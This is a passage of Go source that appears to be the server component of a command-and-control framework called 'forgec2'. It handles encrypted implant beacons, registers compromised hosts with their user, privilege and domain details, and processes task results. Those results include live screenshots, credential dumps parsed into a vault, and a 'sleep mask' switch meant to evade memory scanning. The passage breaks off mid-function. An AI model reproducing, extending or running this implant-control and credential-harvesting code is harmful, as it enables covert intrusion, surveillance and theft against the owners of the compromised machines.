package server

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log/slog"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime/debug"
	"strconv"
	"strings"
	"time"

	"context"

	"github.com/forgec2/forgec2/internal/crypto"
	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/plugin"
	"github.com/forgec2/forgec2/pkg/encoding"
	"github.com/forgec2/forgec2/pkg/protocol"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"gorm.io/gorm"
	"gorm.io/gorm/clause"
)

// Local copies of protocol types (agent package is not importable as it is package main + build constrained)
type beaconRequest struct {
	UUID            string            `json:"uuid"`
	ProtocolVersion uint              `json:"pv,omitempty"`
	Info            map[string]string `json:"info,omitempty"`
	Results         []taskResult      `json:"results,omitempty"`
	AckTaskIDs      []uint            `json:"acks,omitempty"`
	TaskCapacity    *int              `json:"task_capacity,omitempty"`
	SocksData       []socksFrame      `json:"socks_data,omitempty"`
	Relayed         []relayedData     `json:"relayed,omitempty"` // P2P: child results forwarded by parent

	// ECDH + AES-256-GCM fields (forward-secret encryption)
	ECDHPub   string `json:"ecdh_pub,omitempty"` // base64-encoded X25519 public key
	CipherB64 string `json:"c,omitempty"`        // base64(nonce + AES-256-GCM ciphertext)
}

type relayedData struct {
	AgentID    string       `json:"agent_id"` // child agent UUID
	Results    []taskResult `json:"results"`
	AckTaskIDs []uint       `json:"acks,omitempty"`
}

type taskResult struct {
	TaskID   uint   `json:"task_id"`
	Type     string `json:"type"`
	Output   string `json:"output"`
	Error    string `json:"error,omitempty"`
	Encoding string `json:"encoding,omitempty"`
	Filename string `json:"filename,omitempty"`
	Size     int64  `json:"size,omitempty"`
	Offset   int64  `json:"offset,omitempty"`
	Path     string `json:"path,omitempty"`
	// ResultID is the agent-generated per-result id used for idempotent
	// processing of re-sent results (dropped frames are retried with a new
	// envelope seq, so dedupe on this instead).
	ResultID string `json:"rid,omitempty"`
	// MAC is the agent's file-transfer integrity chain link (hex).
	MAC string `json:"mac,omitempty"`
}

type task struct {
	ID        uint   `json:"id"`
	Type      string `json:"type"`
	Command   string `json:"command"`
	Encrypted bool   `json:"enc,omitempty"`
	Shell     string `json:"shell"`
	Path      string `json:"path,omitempty"`
	Data      string `json:"data,omitempty"`
	Offset    int64  `json:"offset,omitempty"`
	Size      int64  `json:"size,omitempty"`
	PrevMAC   string `json:"prev_mac,omitempty"`
	MAC       string `json:"mac,omitempty"`
}

type relayedTask struct {
	AgentID string `json:"agent_id"` // child agent UUID
	Tasks   []task `json:"tasks"`
}

type beaconResponse struct {
	Tasks           []task        `json:"tasks"`
	ProtocolVersion uint          `json:"pv,omitempty"`
	Seq             uint64        `json:"seq,omitempty"`
	RegOK           bool          `json:"reg_ok,omitempty"`
	Rekey           bool          `json:"rekey,omitempty"`
	SocksFrames     []socksFrame  `json:"socks_frames,omitempty"`
	SocksFastMode   bool          `json:"socks_fast,omitempty"`
	Relayed         []relayedTask `json:"relayed,omitempty"` // P2P: tasks for children

	// Fleet kill-switch broadcast: both fields are set only while the
	// kill-switch is armed. KillSwitch is the per-arm token (hex) and
	// KillSwitchMAC its per-implant authentication tag
	// HMAC-SHA256(regKey-derived kill-switch key, token), so only the
	// server holding the registration key can order self-destruct.
	KillSwitch    string `json:"kill_switch,omitempty"`
	KillSwitchMAC string `json:"kill_switch_mac,omitempty"`

	// ECDH + AES-256-GCM fields
	ECDHPub   string `json:"ecdh_pub,omitempty"` // base64-encoded server X25519 public key
	CipherB64 string `json:"c,omitempty"`        // base64(nonce + AES-256-GCM ciphertext)
	Mac       string `json:"mac,omitempty"`      // auth frame response MAC: HMAC(regKey, agentUUID||seq||server_pub)
}

// beaconEnvelope is the top-level transport envelope shared by HTTP, TCP and
// WebSocket beacons. Protocol v2: frames carry a monotonic per-agent sequence
// number and a Unix timestamp; the shared beacon key is never transmitted.
type beaconEnvelope struct {
	UUID        string `json:"uuid"`
	Seq         uint64 `json:"seq,omitempty"`
	Ts          int64  `json:"ts,omitempty"`
	ECDHPub     string `json:"ecdh_pub,omitempty"` // base64 X25519 public key (handshake/registration)
	CipherB64   string `json:"c,omitempty"`        // base64(nonce + AES-256-GCM ciphertext)
	Mac         string `json:"mac,omitempty"`      // HMAC(regKey, uuid||ecdh_pub||ts) for handshake frames
	IdentityPub string `json:"id_pub,omitempty"`   // registration: agent identity public key
	RegHMAC     string `json:"reg_hmac,omitempty"` // registration: HMAC(regKey, uuid||id_pub||ts)
	SecretID    string `json:"secret_id,omitempty"` // v3 registration: per-implant secret id ("" = legacy v2 master-key path)
}

// beaconFrameKind classifies a decoded envelope.
type beaconFrameKind int

const (
	frameRejected  beaconFrameKind = iota
	frameEncrypted                 // ciphertext frame with an established session
	frameHandshake                 // authenticated ECDH handshake (rekey / restart recovery)
	frameRegister                  // one-time v2 registration binding the identity key
)

// beaconTsTolerance is the maximum clock skew accepted between the agent's
// frame timestamp and server time.
const beaconTsTolerance = 300 // seconds

// maxSeqJump is the maximum accepted per-frame sequence advance before the
// frame is rejected as a replay flood / desync indicator.
const maxSeqJump = 1000

// deriveRegKey returns the per-agent registration key. v3: when the implant
// has a bound per-implant secret, that secret is used directly (the master key
// is never embedded in v3 payloads). v2 legacy: derived from the master beacon
// key. nil when neither is available.
func (s *Server) deriveRegKey(agentID string) []byte {
	var secretID string
	if err := s.db.Model(&db.Implant{}).Where("id = ?", agentID).Pluck("secret_id", &secretID).Error; err == nil && secretID != "" {
		if key := s.regSecretByID(secretID); key != nil {
			return key
		}
	}
	return crypto.DeriveRegistrationKeyFromHex(s.serverBeaconKey(), agentID)
}

// computeAuthMAC computes the authentication MAC for handshake/registration
// request frames and handshake response frames:
//
//	request:  HMAC(regKey, uuid || ecdh_pub || ts)
//	response: HMAC(regKey, uuid || seq || server_pub)
//
// An attacker without the registration key cannot forge either direction.
func computeAuthMAC(regKey []byte, parts ...string) string {
	mac := hmac.New(sha256.New, regKey)
	for _, p := range parts {
		mac.Write([]byte(p))
	}
	return base64.StdEncoding.EncodeToString(mac.Sum(nil))
}

// acceptSeq atomically advances last_seq for an implant. Returns false when
// the frame is a replay (seq <= last_seq) or the implant does not exist yet.
// The gap flag reports an unreasonably large jump (possible desync or replay
// flood) so callers can log an alert.
func (s *Server) acceptSeq(agentID string, seq uint64) (accepted bool, gap bool) {
	var lastSeq uint64
	if err := s.db.Model(&db.Implant{}).Where("id = ?", agentID).Pluck("last_seq", &lastSeq).Error; err != nil {
		return false, false
	}
	if seq <= lastSeq {
		return false, false
	}
	res := s.db.Model(&db.Implant{}).
		Where("id = ? AND last_seq = ?", agentID, lastSeq).
		Update("last_seq", seq)
	if res.Error != nil || res.RowsAffected != 1 {
		return false, false
	}
	return true, seq-lastSeq > maxSeqJump
}

// decodeBeaconEnvelope parses and authenticates a v2 transport envelope.
// Returns the envelope, the inner (decrypted) request when applicable, and the
// frame kind. Protocol v1/plaintext frames are rejected outright.
func (s *Server) decodeBeaconEnvelope(raw []byte) (envelope beaconEnvelope, req beaconRequest, kind beaconFrameKind) {
	if err := json.Unmarshal(raw, &envelope); err != nil {
		slog.Warn("Beacon: invalid envelope JSON")
		return beaconEnvelope{}, beaconRequest{}, frameRejected
	}
	if envelope.UUID == "" {
		envelope.UUID = uuid.New().String()
	}
	if !isValidAgentID(envelope.UUID) {
		slog.Warn("Beacon rejected: invalid agent ID", "agent_id", envelope.UUID)
		return beaconEnvelope{}, beaconRequest{}, frameRejected
	}

	// Timestamp window: reject stale or clock-skewed frames.
	now := time.Now().Unix()
	if envelope.Ts == 0 || now-envelope.Ts > beaconTsTolerance || envelope.Ts-now > beaconTsTolerance {
		slog.Warn("Beacon rejected: timestamp outside tolerance", "agent_id", envelope.UUID, "ts", envelope.Ts)
		return beaconEnvelope{}, beaconRequest{}, frameRejected
	}

	if envelope.CipherB64 != "" {
		// Encrypted frame. Advance the replay window before decrypting so
		// replayed ciphertext is rejected even if it somehow decrypts.
		accepted, gap := s.acceptSeq(envelope.UUID, envelope.Seq)
		if !accepted {
			slog.Warn("Beacon rejected: replay or out-of-order seq", "agent_id", envelope.UUID, "seq", envelope.Seq)
			return beaconEnvelope{}, beaconRequest{}, frameRejected
		}
		if gap {
			slog.Warn("Beacon: large seq jump", "agent_id", envelope.UUID, "seq", envelope.Seq)
		}

		if s.sessionManager == nil {
			slog.Warn("Beacon rejected: session manager unavailable", "agent_id", envelope.UUID)
			return beaconEnvelope{}, beaconRequest{}, frameRejected
		}
		plaintext, err := s.sessionManager.DecryptWithAADB64(envelope.UUID, envelope.CipherB64, []byte(envelope.UUID+"\x00"+strconv.FormatUint(envelope.Seq, 10)))
		if err != nil {
			slog.Warn("ECDH decryption failed", "agent_id", envelope.UUID, "err", err)
			return beaconEnvelope{}, beaconRequest{}, frameRejected
		}
		s.configMu.RLock()
		maxPayload := s.cfg.Crypto.MaxDecryptedPayloadSize
		s.configMu.RUnlock()
		if maxPayload <= 0 {
			maxPayload = 10 * 1024 * 1024 // default 10MB
		}
		if len(plaintext) > maxPayload {
			slog.Warn("Beacon decrypted payload too large", "agent_id", envelope.UUID, "size", len(plaintext), "max", maxPayload)
			return beaconEnvelope{}, beaconRequest{}, frameRejected
		}
		if err := encoding.Unmarshal(plaintext, &req); err != nil {
			slog.Warn("Beacon decrypted payload parse failed", "agent_id", envelope.UUID, "err", err)
			return beaconEnvelope{}, beaconRequest{}, frameRejected
		}
		req.UUID = envelope.UUID
		s.sessionManager.IncrementMessageCount(envelope.UUID)
		return envelope, req, frameEncrypted
	}

	if envelope.ECDHPub != "" {
		if envelope.IdentityPub != "" && envelope.RegHMAC != "" {
			return envelope, beaconRequest{}, frameRegister
		}
		if envelope.Mac != "" {
			return envelope, beaconRequest{}, frameHandshake
		}
		slog.Warn("Beacon rejected: unauthenticated handshake frame", "agent_id", envelope.UUID)
		return beaconEnvelope{}, beaconRequest{}, frameRejected
	}

	// v2 has no plaintext frames.
	slog.Warn("Beacon rejected: plaintext frame not allowed", "agent_id", envelope.UUID)
	return beaconEnvelope{}, beaconRequest{}, frameRejected
}

// ensureBeaconImplantRow creates a minimal implant row for fresh agents whose
// first contact is a v2 registration frame (register frames carry no host info,
// so the normal processAgentRegistration path is not available).
func (s *Server) ensureBeaconImplantRow(agentID string) {
	var count int64
	if err := s.db.Model(&db.Implant{}).Where("id = ?", agentID).Count(&count).Error; err != nil || count > 0 {
		return
	}
	row := db.Implant{ID: agentID, LastSeen: time.Now(), Status: "online"}
	if err := s.db.Create(&row).Error; err != nil {
		// Concurrent create for the same UUID: someone else won the race.
		slog.Debug("ensureBeaconImplantRow create skipped", "agent_id", agentID, "error", err)
	}
}

// processAuthFrame handles v2 registration and handshake frames. Both are
// authenticated with the per-agent registration key. Returns the JSON response
// envelope and ok=false on any authentication/state failure.
func (s *Server) processAuthFrame(env beaconEnvelope, kind beaconFrameKind) ([]byte, bool) {
	regKey := s.deriveRegKey(env.UUID)
	if kind == frameRegister && env.SecretID != "" {
		// v3: the implant carries only its own per-implant secret id, so the
		// registration key must come from the secret store, not the master key.
		if key := s.regSecretByID(env.SecretID); key != nil {
			regKey = key
		} else {
			slog.Warn("Beacon registration rejected: unknown secret_id", "agent_id", env.UUID)
			return nil, false
		}
	}
	if regKey == nil {
		slog.Warn("Beacon rejected: no master beacon key configured", "agent_id", env.UUID)
		return nil, false
	}

	if kind == frameRegister {
		s.ensureBeaconImplantRow(env.UUID)
		expected := crypto.ComputeRegHMAC(regKey, env.UUID, env.IdentityPub, env.Ts)
		got, err := base64.StdEncoding.DecodeString(env.RegHMAC)
		if err != nil || !hmac.Equal(expected, got) {
			slog.Warn("Beacon registration rejected: bad reg_hmac", "agent_id", env.UUID)
			return nil, false
		}
		pub, err := base64.StdEncoding.DecodeString(env.IdentityPub)
		if err != nil || len(pub) != 32 {
			slog.Warn("Beacon registration rejected: invalid identity key", "agent_id", env.UUID)
			return nil, false
		}
		updates := map[string]interface{}{
			"identity_pub": env.IdentityPub,
			"registered":   true,
			"last_seq":     env.Seq,
		}
		if env.SecretID != "" {
			updates["secret_id"] = env.SecretID
		}
		// Bind identity: only the first registration (registered=false) wins.
		res := s.db.Model(&db.Implant{}).
			Where("id = ? AND registered = ? AND last_seq < ?", env.UUID, false, env.Seq).
			Updates(updates)
		if res.Error != nil || res.RowsAffected != 1 {
			slog.Warn("Beacon registration rejected: already registered or replay", "agent_id", env.UUID)
			return nil, false
		}
		s.bindRegSecret(env.SecretID, env.UUID)
		if s.sessionManager != nil {
			if err := s.sessionManager.EstablishSession(env.UUID, pub); err != nil {
				slog.Warn("Beacon registration: session establish failed", "agent_id", env.UUID, "err", err)
				return nil, false
			}
		}
		if env.SecretID != "" {
			slog.Info("Beacon registered (v3 per-implant secret)", "agent_id", env.UUID)
		} else {
			slog.Info("Beacon registered (v2 master key)", "agent_id", env.UUID)
		}
	} else { // frameHandshake
		// The handshake must bind the presented ecdh_pub to the registration key.
		expected := computeAuthMAC(regKey, env.UUID, env.ECDHPub, strconv.FormatInt(env.Ts, 10))
		got, err := base64.StdEncoding.DecodeString(env.Mac)
		if err != nil {
			slog.Warn("Beacon handshake rejected: bad mac encoding", "agent_id", env.UUID)
			return nil, false
		}
		expectedRaw, decErr := base64.StdEncoding.DecodeString(expected)
		if decErr != nil || !hmac.Equal(expectedRaw, got) {
			slog.Warn("Beacon handshake rejected: bad mac", "agent_id", env.UUID)
			return nil, false
		}
		accepted, gap := s.acceptSeq(env.UUID, env.Seq)
		if !accepted {
			slog.Warn("Beacon handshake rejected: replay", "agent_id", env.UUID, "seq", env.Seq)
			return nil, false
		}
		if gap {
			slog.Warn("Beacon handshake: large seq jump", "agent_id", env.UUID, "seq", env.Seq)
		}
		pub, err := base64.StdEncoding.DecodeString(env.ECDHPub)
		if err != nil || len(pub) != 32 {
			slog.Warn("Beacon handshake rejected: invalid key", "agent_id", env.UUID)
			return nil, false
		}
		if s.sessionManager == nil {
			slog.Warn("Beacon handshake rejected: session manager unavailable", "agent_id", env.UUID)
			return nil, false
		}
		if err := s.sessionManager.EstablishSession(env.UUID, pub); err != nil {
			slog.Warn("Beacon handshake failed", "agent_id", env.UUID, "err", err)
			return nil, false
		}
	}

	serverPub := base64.StdEncoding.EncodeToString(s.sessionManager.GetPublicKey())
	resp := beaconResponse{
		ProtocolVersion: protocol.CurrentProtocolVersion,
		Seq:             env.Seq,
		RegOK:           kind == frameRegister,
		ECDHPub:         serverPub,
		Mac:             computeAuthMAC(regKey, env.UUID, strconv.FormatUint(env.Seq, 10), serverPub),
	}
	respBytes, ok := marshalJSONSafe(resp)
	if !ok {
		return nil, false
	}
	return respBytes, true
}

// buildBeaconResponse wraps a processed beacon response in the transport
// envelope, mirroring the HTTP handler. Shared by HTTP, TCP and WebSocket
// beacon paths so every transport returns identical envelope semantics
// (AES-256-GCM encrypted with AAD binding agent ID and sequence number).
func (s *Server) buildBeaconResponse(agentID string, seq uint64, resp beaconResponse) ([]byte, bool) {
	if s.sessionManager == nil {
		slog.Error("ECDH response requested but session manager not initialized", "agent_id", agentID)
		return nil, false
	}
	resp.ProtocolVersion = protocol.CurrentProtocolVersion
	resp.Seq = seq
	respBytes, ok := marshalJSONSafe(resp)
	if !ok {
		return nil, false
	}
	cipherB64, err := s.sessionManager.EncryptB64WithAAD(agentID, respBytes, []byte(agentID+"\x00"+strconv.FormatUint(seq, 10)))
	if err != nil {
		slog.Error("ECDH response encryption failed", "agent_id", agentID, "err", err)
		return nil, false
	}
	return marshalJSONSafe(beaconResponse{CipherB64: cipherB64})
}

// isValidAgentID enforces a strict format for agent IDs, which are used as DB
// primary keys and filesystem path components. Accepts canonical RFC 4122 UUIDs
// plus the fixed prefixes used by the WS listener (ws_) and gRPC fallback (unknown-).
func isValidAgentID(id string) bool {
	if id == "" {
		return false
	}
	check := strings.TrimPrefix(id, "ws_")
	if check == id {
		check = strings.TrimPrefix(id, "unknown-")
	}
	if check == "" {
		return false
	}
	u, err := uuid.Parse(check)
	if err != nil {
		return false
	}
	return strings.EqualFold(u.String(), check)
}

func (s *Server) handleBeacon(c *gin.Context) {
	beaconStart := time.Now()
	defer func() {
		if s.metrics != nil {
			transport := "http"
			s.metrics.BeaconDuration.WithLabelValues(transport).Observe(time.Since(beaconStart).Seconds())
		}
	}()

	// Step 1: parse the top-level JSON envelope (v2 protocol)
	raw, err := c.GetRawData()
	if err != nil {
		respondError(c, http.StatusBadRequest, "failed to read body")
		return
	}

	env, req, kind := s.decodeBeaconEnvelope(raw)
	if kind == frameRejected {
		respondError(c, http.StatusBadRequest, "invalid beacon payload")
		return
	}

	publicIP := c.ClientIP()

	var respBytes []byte
	if kind == frameEncrypted {
		resp := s.processBeacon(req, publicIP)
		if s.sessionManager.NeedsRekey(req.UUID, BeaconSessionRekeyMessages) {
			resp.Rekey = true
		}
		var ok bool
		respBytes, ok = s.buildBeaconResponse(req.UUID, env.Seq, resp)
		if !ok {
			respondError(c, http.StatusInternalServerError, "response build failed")
			return
		}
	} else {
		var ok bool
		respBytes, ok = s.processAuthFrame(env, kind)
		if !ok {
			respondError(c, http.StatusBadRequest, "authentication failed")
			return
		}
	}

	// Async GeoIP lookup (don't block beacon response) — only when enabled in config.
	// Uses a buffered channel as a bounded queue: when full, oldest entries are dropped
	// to avoid unbounded goroutine growth under heavy beacon load.
	s.configMu.RLock()
	geoIPEnabled := s.cfg.Server.GeoIPEnabled
	s.configMu.RUnlock()
	if geoIPEnabled && publicIP != "" && publicIP != "127.0.0.1" && publicIP != "::1" {
		select {
		case s.geoIPSem <- struct{}{}:
			s.wg.Add(1)
			go func() {
				defer func() {
					<-s.geoIPSem
					s.wg.Done()
					if r := recover(); r != nil {
						slog.Error("recovered from panic", "err", r, "stack", string(debug.Stack()))
					}
				}()
				ctx, cancel := context.WithTimeout(s.ctx, GeoIPLookupTimeout)
				defer cancel()
				country, city, lat, lon := s.lookupGeoIP(ctx, publicIP)
				if country != "" {
					result := s.db.Model(&db.Implant{}).
						Where("id = ? AND (country != ? OR city != ?)", req.UUID, country, city).
						Updates(map[string]interface{}{
							"country": country, "city": city,
							"latitude": lat, "longitude": lon,
						})
					if result.Error != nil {
						slog.Error("Failed to update GeoIP data", "agent_id", req.UUID, "err", result.Error)
					}
				}
			}()
		default:
			slog.Warn("GeoIP lookup queue full, dropping lookup", "agent_id", req.UUID, "ip", publicIP)
		}
	}

	c.Data(http.StatusOK, "application/json", respBytes)
}

func decodeBeaconIdentity(info map[string]string) (hostname, username, ip string) {
	if info == nil {
		return "", "", ""
	}
	hostname = info["hostname"]
	username = info["username"]
	ip = info["ip"]
	if info["encoding"] == "base64" {
		if decoded, err := base64.StdEncoding.DecodeString(hostname); err == nil {
			hostname = string(decoded)
		}
		if decoded, err := base64.StdEncoding.DecodeString(username); err == nil {
			username = string(decoded)
		}
		if decoded, err := base64.StdEncoding.DecodeString(ip); err == nil {
			ip = string(decoded)
		}
	}
	return hostname, username, ip
}

var allowedInfoKeys = map[string]bool{
	"hostname": true, "ip": true, "public_ip": true, "os": true, "arch": true,
	"username": true, "integrity": true, "elevated": true, "domain": true,
	"country": true, "city": true, "latitude": true, "longitude": true,
	"version": true, "pid": true, "process_name": true, "parent_id": true,
	"peer_count": true, "tags": true, "note": true, "encoding": true,
	"listener_id": true, "interval": true, "jitter": true, "active_window": true,
	"env_threat_score": true, "env_honeypot": true, "env_class": true,
}

const maxInfoValueLen = 512

func sanitizeInfo(info map[string]string) map[string]string {
	if info == nil {
		return nil
	}
	sanitized := make(map[string]string, len(info))
	for k, v := range info {
		if !allowedInfoKeys[k] {
			continue
		}
		v = strings.ReplaceAll(v, "\x00", "")
		v = strings.TrimSpace(v)
		if len([]rune(v)) > maxInfoValueLen {
			v = string([]rune(v)[:maxInfoValueLen])
		}
		sanitized[k] = v
	}
	return sanitized
}

func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, now time.Time) (db.Implant, bool) {
	req.Info = sanitizeInfo(req.Info)
	parseInt := func(key string) int {
		if req.Info == nil {
			return 0
		}
		if v, err := strconv.Atoi(req.Info[key]); err == nil {
			return v
		}
		return 0
	}

	var agent db.Implant
	result := s.db.Where("id = ?", req.UUID).First(&agent)
	isNewAgent := result.Error == gorm.ErrRecordNotFound

	if isNewAgent {
		hostname, username, ip := decodeBeaconIdentity(req.Info)
		if strings.TrimSpace(hostname) == "" && strings.TrimSpace(ip) == "" {
			slog.Warn("Rejected ghost agent registration", "agent_id", req.UUID, "public_ip", publicIP)
			return db.Implant{}, false
		}

		agent = db.Implant{
			ID:              req.UUID,
			Hostname:        hostname,
			Username:        username,
			OS:              req.Info["os"],
			Arch:            req.Info["arch"],
			IP:              ip,
			PublicIP:        publicIP,
			LastSeen:        now,
			Status:          "online",
			Version:         req.Info["version"],
			PID:             parseInt("pid"),
			ProcessName:     req.Info["process_name"],
			Integrity:       req.Info["integrity"],
			Elevated:        req.Info["elevated"] == "true",
			Domain:          req.Info["domain"],
			CurrentInterval: parseInt("interval"),
			CurrentJitter:   parseInt("jitter"),
			ActiveWindow:    req.Info["active_window"],
		}
		if v, ok := req.Info["env_threat_score"]; ok {
			if score, err := strconv.Atoi(v); err == nil && score >= 0 && score <= 100 {
				agent.EnvThreatScore = score
			}
		}
		if v, ok := req.Info["env_honeypot"]; ok {
			agent.EnvHoneypot = v == "true"
		}
		if v, ok := req.Info["env_class"]; ok {
			agent.EnvClass = v
		}
		if lid := req.Info["listener_id"]; lid != "" {
			if id, err := strconv.ParseUint(lid, 10, 32); err == nil {
				agent.ListenerID = uint(id)
			}
		}
		if err := s.db.Create(&agent).Error; err != nil {
			// Concurrent first check-in for the same UUID: the other goroutine's
			// Create won the primary-key race. Re-read the now-existing row and
			// continue as an update path instead of dropping this beacon.
			slog.Debug("Agent create raced, re-reading existing row", "agent_id", agent.ID, "error", err)
			if rerr := s.db.Where("id = ?", req.UUID).First(&agent).Error; rerr != nil {
				slog.Error("Failed to create agent", "agent_id", agent.ID, "error", err)
				return db.Implant{}, false
			}
			return agent, false
		}
		slog.Info("New agent registered", "agent_id", agent.ID, "hostname", agent.Hostname, "ip", agent.IP, "listener_id", agent.ListenerID)
		s.broadcastAgentOnline(agent, true)
		s.recordAgentStatusEvent(agent.ID, "online")
		s.eventManager.Emit(Event{
			Type:      EventImplantCheckin,
			AgentID:   agent.ID,
			AgentHost: agent.Hostname,
			Timestamp: now,
			Data:      map[string]interface{}{"new": true, "ip": agent.IP},
		})
	} else {
		prevStatus := s.agentStatus(agent).Status
		if agent.Status == "offline" || agent.Status == "stale" {
			prevStatus = agent.Status
		}

		updates := map[string]interface{}{
			"last_seen": now,
			"status":    "online",
		}
		if publicIP != "" && publicIP != agent.PublicIP {
			updates["public_ip"] = publicIP
		}
		if v := req.Info["version"]; v != "" {
			updates["version"] = v
		}
		if v := req.Info["process_name"]; v != "" {
			updates["process_name"] = v
		}
		if v := req.Info["integrity"]; v != "" {
			updates["integrity"] = v
		}
		if v := req.Info["domain"]; v != "" {
			updates["domain"] = v
		}
		if v := req.Info["elevated"]; v != "" {
			updates["elevated"] = v == "true"
		}
		if pid := parseInt("pid"); pid > 0 {
			updates["pid"] = pid
		}
		if interval := parseInt("interval"); interval >= 0 {
			updates["current_interval"] = interval
		}
		if jitter := parseInt("jitter"); jitter >= 0 {
			updates["current_jitter"] = jitter
		}
		if req.Info != nil {
			if v, ok := req.Info["active_window"]; ok {
				updates["active_window"] = v
			}
		}
		if lid := req.Info["listener_id"]; lid != "" {
			if id, err := strconv.ParseUint(lid, 10, 32); err == nil && agent.ListenerID == 0 {
				updates["listener_id"] = uint(id)
			}
		}
		// Environment threat data from agent self-assessment
		if v, ok := req.Info["env_threat_score"]; ok {
			if score, err := strconv.Atoi(v); err == nil && score >= 0 && score <= 100 {
				updates["env_threat_score"] = score
			}
		}
		if v, ok := req.Info["env_honeypot"]; ok {
			updates["env_honeypot"] = v == "true"
		}
		if v, ok := req.Info["env_class"]; ok {
			updates["env_class"] = v
		}

		// Atomic update: only update if last_seen hasn't been changed by a concurrent beacon
		updateErr := s.db.Transaction(func(tx *gorm.DB) error {
			txResult := tx.Model(&db.Implant{}).Where("id = ? AND last_seen <= ?", agent.ID, agent.LastSeen).Updates(updates)
			if txResult.Error != nil {
				return txResult.Error
			}
			if txResult.RowsAffected == 0 {
				slog.Warn("Concurrent beacon update conflict, retrying", "agent_id", agent.ID)
			}
			// Re-read to get consistent state
			return tx.Where("id = ?", agent.ID).First(&agent).Error
		})
		if updateErr != nil {
			slog.Error("Failed to update agent", "agent_id", agent.ID, "error", updateErr)
			return agent, false
		}
		agent.LastSeen = now
		agent.Status = "online"

		if prevStatus != "online" {
			s.broadcastAgentOnline(agent, false)
			s.recordAgentStatusEvent(agent.ID, "online")
			s.eventManager.Emit(Event{
				Type:      EventImplantCheckin,
				AgentID:   agent.ID,
				AgentHost: agent.Hostname,
				Timestamp: now,
				Data:      map[string]interface{}{"new": false, "reconnected": true, "prev_status": prevStatus, "ip": agent.IP},
			})
		}
		slog.Info("Beacon processed", "agent_id", req.UUID, "last_seen", now, "status", "online", "prev_status", prevStatus)
	}

	return agent, isNewAgent
}

func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid string, now time.Time) {
	// Batch-load all referenced tasks
	taskIDs := make([]uint, 0, len(results))
	taskIDSet := make(map[uint]struct{})
	for _, r := range results {
		if r.TaskID > 0 {
			if _, ok := taskIDSet[r.TaskID]; !ok {
				taskIDs = append(taskIDs, r.TaskID)
				taskIDSet[r.TaskID] = struct{}{}
			}
		}
	}
	var loadedTasks []db.Task
	if len(taskIDs) > 0 {
		if err := s.db.Where("id IN ? AND LOWER(agent_id) = LOWER(?)", taskIDs, uuid).Limit(len(taskIDs)).Find(&loadedTasks).Error; err != nil {
			slog.Error("Failed to batch-load tasks", "agent_id", uuid, "error", err)
		}
	}
	taskMap := make(map[uint]*db.Task, len(loadedTasks))
	for i := range loadedTasks {
		taskMap[loadedTasks[i].ID] = &loadedTasks[i]
	}

	var pendingAudit []auditEntry
	defer func() { s.LogAuditRecords(nil, pendingAudit) }()

	for _, r := range results {
		if s.isDuplicateResult(uuid, r) {
			slog.Debug("Duplicate task result dropped", "agent_id", uuid, "task_id", r.TaskID, "type", r.Type, "rid", r.ResultID)
			continue
		}
		if r.Type == "screen_frame" && r.Output != "" {
			if s.IsScreenMonitoring(uuid) {
				s.BroadcastScreenshot(uuid, r.Output)
			}
			continue
		}

		slog.Info("Processing task result", "task_id", r.TaskID, "type", r.Type, "has_output", r.Output != "", "has_error", r.Error != "", "error_message", r.Error)

		task, ok := taskMap[r.TaskID]
		if !ok {
			continue
		}
		if task.AcknowledgedAt == nil {
			acknowledgedAt := now
			task.AcknowledgedAt = &acknowledgedAt
		}
		task.Status = "completed"
		if r.Error != "" {
			task.Status = "failed"
			task.Error = r.Error
		}
		task.UpdatedAt = now

		// Decrement per-agent pending task counter
		s.agentPendingTasksMu.Lock()
		if s.agentPendingTasks[uuid] > 0 {
			s.agentPendingTasks[uuid]--
		}
		s.agentPendingTasksMu.Unlock()

		// For monitoring control tasks, do not retain them in DB at all
		if r.Type == "screen_stream_start" || r.Type == "screen_stream_stop" {
			task.Result = "processed"
			s.broadcastTaskUpdate(uuid, *task)
			if err := s.db.Delete(task).Error; err != nil {
				slog.Error("Failed to delete screen control task", "task_id", task.ID, "error", err)
			}
			continue
		}

		// Silent task types: save result for polling but skip WebSocket broadcast
		isSilent := r.Type == "ls"

		// Auto-switch sleep mask on integrity failure to evade memory scanning
		if r.Type == "sleep_mask_integrity_alert" && task.Status == "completed" {
			s.autoSwitchSleepMask(uuid, r.Output)
		}

		if r.Type == "screenshot" && r.Output != "" {
			slog.Info("Processing screenshot result", "agent_id", uuid, "task_id", r.TaskID)

			if s.IsScreenMonitoring(uuid) {
				task.Result = "[live screen monitoring - not retained]"
				s.BroadcastScreenshot(uuid, r.Output)
				slog.Info("Screen frame received (monitoring - not saved to file)", "agent_id", uuid)
			} else {
				// Keep as base64 so the frontend can directly use it in data: URL
				task.Result = r.Output
				s.saveScreenshot(s.cfg.Server.DataDir, uuid, task.ID, r.Output)
			}
		} else if (r.Type == "upload" || r.Type == "download") && r.Encoding == "base64" {
			task.Result = r.Output
		} else {
			if r.Encoding == "base64" && r.Output != "" {
				decoded, err := base64.StdEncoding.DecodeString(r.Output)
				if err == nil {
					task.Result = string(decoded)
				} else {
					task.Result = r.Output
				}
			} else {
				task.Result = r.Output
			}
		}

		// Format token_list_procs results into a readable table
		if r.Type == "token_list_procs" && task.Result != "" {
			task.Result = FormatTokenProcsFromJSON(task.Result)
		}

		// When set_sleep succeeds, update agent's current interval/jitter
		if r.Type == "set_sleep" && task.Status == "completed" {
			parts := strings.Split(task.Command, ",")
			sleepUpdates := map[string]interface{}{}
			if len(parts) >= 1 {
				if v, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil {
					sleepUpdates["current_interval"] = v
				}
			}
			if len(parts) >= 2 {
				if v, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
					sleepUpdates["current_jitter"] = v
				}
			}
			if len(sleepUpdates) > 0 {
				if err := s.db.Model(&db.Implant{}).Where("id = ?", uuid).Updates(sleepUpdates).Error; err != nil {
					slog.Error("Failed to update sleep settings on agent", "agent_id", uuid, "error", err)
				} else {
					s.broadcastAgentDataUpdate(uuid, sleepUpdates)
				}
			}
		}

		// Auto-parse credential dump results into the vault
		if r.Type == "creds" && task.Status == "completed" && task.Result != "" {
			parseAndStoreCredentials(s.db, uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
